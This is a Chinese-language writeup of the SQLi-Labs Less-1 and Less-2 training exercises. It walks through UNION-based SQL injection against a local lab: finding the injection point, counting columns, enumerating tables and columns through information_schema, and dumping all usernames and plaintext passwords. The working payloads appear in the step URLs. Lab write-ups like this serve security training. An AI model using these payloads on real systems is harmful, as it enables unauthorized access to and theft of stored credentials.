【SQLi-Labs】Less-1 字符型联合查询注入 Writeup

操作者：何芊宏 | 操作日期：2026.10.22 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, MySQL

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-1 (字符型注入) / Less-2 (整型注入)
  • 提示：GET请求，基于报错，使用 UNION 联合查询

2. 解题思路

针对基于报错的联合查询注入，通用的测试及利用流程如下：首先，测试是否存在 SQL 注入点（通过输入单引号破坏原有语法）。其次，使用 ORDER BY 语句确定后台查询的字段数量。接着，使用 UNION SELECT 语句探测前端页面的回显点（即能够将数据库查询结果输出到页面的位置）。最后，利用 information_schema 系统元数据表，逐级获取数据库名、表名、列名，并获取目标表中的敏感数据。

3. 操作步骤

第一步：Less-1 探测注入点与字段数

输入 URL：http://localhost/sqli-labs-master/Less-1/?id=1'

解释：在正常参数 1 后面加入单引号，用于尝试闭合后台 SQL 语句中的单引号。

回显现象：页面抛出黄色的 SQL 语法错误提示：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1。

原理分析：后台原查询语句大概率是 SELECT * FROM users WHERE id = '$id' LIMIT 0,1。输入 1' 后，实际执行变为 id = '1''，多余的引号破坏了语法，证明存在字符型注入。

第二步：Less-1 确定字段数

输入 URL：http://localhost/sqli-labs-master/Less-1/?id=1' ORDER BY 3 --+

回显现象：页面正常回显账号密码（Dumb / Dumb）。

输入 URL：http://localhost/sqli-labs-master/Less-1/?id=1' ORDER BY 4 --+

回显现象：页面报错：Unknown column '4' in 'order clause'。

解释与原理：ORDER BY 用于按指定列排序，当指定的列数超出实际查询列数时会报错。据此推断后台查询共有 3 个字段。--+ 是注释符（URL 中 + 代表空格），用于将后台剩余的 ' LIMIT 0,1 注释掉，保证语法正确。

第三步：Less-1 探测回显点

输入 URL：http://localhost/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1,2,3 --+

解释：将 id 设为 -1（使前一条查询结果为空），利用 UNION SELECT 拼接查询数字 1、2、3。

回显现象：页面原本显示账号密码的位置，分别输出了数字 2 和 3，数字 1 未显示。

原理分析：说明后端代码只将查询结果的第 2 列和第 3 列输出到了前端页面中。这两个位置即为“回显点”，后续可将数字替换为需要查询的 SQL 函数或字段。

第四步：Less-1 获取基础信息

输入 URL：http://localhost/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1, database(), version() --+

解释：将回显点替换为数据库内置函数，database() 查当前库名，version() 查版本。

回显现象：页面回显 security 和 5.7.26。

原理分析：确认当前数据库名为 security，版本 5.7.26 表示支持 information_schema 系统库。

第五步：Less-1 获取表名

输入 URL：http://localhost/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1,2, group_concat(table_name) FROM information_schema.tables WHERE table_schema='security' --+

解释：information_schema.tables 是 MySQL 自带的元数据表，存放所有表的信息。group_concat() 函数用于将多行查询结果合并为一行字符串，防止页面只显示第一行。WHERE table_schema='security' 限制了只查询当前库的表。

回显现象：回显点 3 的位置输出了 emails, referrers, uagents, users。

第六步：Less-1 获取列名

输入 URL：http://localhost/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1,2, group_concat(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users' --+

解释：改为查询 information_schema.columns 表，增加 AND table_name='users' 条件锁定目标表。

回显现象：回显点 3 的位置输出了列名 id, username, password。

第七步：Less-1 提取最终数据

输入 URL：http://localhost/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1, group_concat(username), group_concat(password) FROM security.users --+

解释：不再查询系统表，直接查询目标库 security 下的目标表 users。将 username 放入回显点 2，将 password 放入回显点 3。

回显现象：页面回显点 2 输出了一长串所有用户名，回显点 3 输出了对应的所有密码明文。

第八步：Less-2 整型注入完整流程

输入 URL：http://localhost/sqli-labs-master/Less-2/?id=1'

回显现象：页面报错 You have an error in your SQL syntax... near '' LIMIT 0,1'。

原理分析：此处报错信息中没有多余的单引号包裹，说明后台代码为 id = $id（整型），不需要闭合单引号。

输入 URL：http://localhost/sqli-labs-master/Less-2/?id=1 ORDER BY 4

回显现象：页面报错 Unknown column '4' in 'order clause'。确认字段数为 3。

输入 URL：http://localhost/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,2,3

回显现象：页面回显数字 2 和 3。确认回显点。

输入最终 Payload：http://localhost/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1, group_concat(username), group_concat(password) FROM security.users

回显现象：页面成功输出所有账号密码。

解释：因为是整型注入，不需要闭合单引号和加注释符，直接在 URL 后面拼接空格和 SQL 语句即可执行。

4. 踩坑记录与复盘

  • 注释符的使用：在字符型注入中，闭合引号后必须使用 --+ 或 %23 将后方原有语句注释掉，否则会因语法错误无法执行注入语句。
  • 回显点的前提：使用 UNION SELECT 时，若前台查到了数据，会优先显示前台数据导致恶意查询被覆盖。因此必须使用 id=-1 等不存在的条件让前一条查询为空。
  • 整型与字符型的区别：字符型需 ' 闭合，整型直接拼接。测试方法为输入 ?id=1'，观察报错信息中是否因为多出单引号导致语法错误。

5. 知识总结

  • information_schema：MySQL 5.0 以上版本自带的元数据表。tables 记录表信息，columns 记录列信息，是 SQL 注入中获取库表结构的核心依赖。
  • group_concat() 函数：MySQL 特有的聚合函数，用于将多行查询结果用逗号连接成一行字符串输出，突破页面仅渲染第一行数据的限制。
  • 回显点：指 Web 页面中接收并渲染数据库查询结果的具体位置。通过输入数字标识（如 1,2,3...）可以测试哪些列的数据会被展示到前端。
